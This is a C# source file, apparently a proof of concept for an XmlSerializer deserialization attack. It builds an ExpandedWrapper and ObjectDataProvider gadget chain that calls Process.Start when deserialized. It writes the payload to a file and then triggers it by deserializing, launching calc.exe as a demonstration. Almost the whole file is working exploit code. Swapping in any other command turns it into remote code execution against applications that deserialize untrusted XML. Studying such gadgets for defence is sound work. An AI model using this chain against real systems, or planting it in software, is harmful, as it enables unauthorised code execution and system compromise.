using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Serialization;
using System.Data.Services.Internal;
using System.Windows.Data;

namespace Deserialize
{

    [XmlRoot]
    public class TestClass
    {
        private string classname;
        private string name;
        private int age;
        [XmlAttribute]
        public string Classname { get => classname; set => classname = value; }
        [XmlElement]
        public string Name { get => name; set => name = value; }
        [XmlElement]
        public int Age { get => age; set => age = value; }

        public override string ToString()
        {
            return base.ToString();
        }

        public void ClassMethod(string cmd)
        {
            System.Diagnostics.Process.Start(cmd);
        }
    }



    class Program
    {
        public static void serializeObjectWithXmlSer()
        {

            ExpandedWrapper<TestClass, ObjectDataProvider> wrapper = new ExpandedWrapper<TestClass, ObjectDataProvider>();
            wrapper.ProjectedProperty0 = new ObjectDataProvider();
            wrapper.ProjectedProperty0.ObjectInstance = new TestClass();
            //wrapper.ProjectedProperty0.ObjectType = typeof(TestClass);
            wrapper.ProjectedProperty0.MethodName = "ClassMethod";
            wrapper.ProjectedProperty0.MethodParameters.Add("calc.exe");

            XmlSerializer serializer = new XmlSerializer(typeof(ExpandedWrapper<TestClass, ObjectDataProvider>));
            TextWriter fo = new StreamWriter("E:/xmlser.txt");
            serializer.Serialize(fo, wrapper);
            fo.Close();
        }

        public static void DeserializerFromXml()
        {
            using (var stream = new FileStream("E:/xmlser.txt", FileMode.Open))
            {
                var serializers = new XmlSerializer(typeof(ExpandedWrapper<TestClass, ObjectDataProvider>));
                var testclass = serializers.Deserialize(stream) as TestClass;
            }
        }

        static void Main(string[] args)
        {

            //serializeObjectWithXmlSer();
            DeserializerFromXml();

        }
    }
}
